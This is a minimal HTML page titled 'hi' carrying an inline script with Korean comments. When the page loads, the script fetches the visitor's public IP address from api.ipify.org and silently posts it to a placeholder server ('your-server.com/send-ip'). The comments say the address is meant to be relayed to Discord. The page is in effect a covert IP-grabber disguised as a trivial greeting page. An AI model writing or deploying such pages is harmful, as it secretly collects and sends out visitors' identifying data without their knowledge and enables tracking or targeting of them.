<html>
<head>
    <title>hi</title>
</head>
<body>
    <h1>hi</h1>
    <script>
        // IP 추적
        fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const ip = data.ip;
            // IP를 서버로 전송 (디스코드로 보내기 위한 준비)
            fetch('https://your-server.com/send-ip', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ ip: ip })
            });
        });
    </script>
</body>
</html>
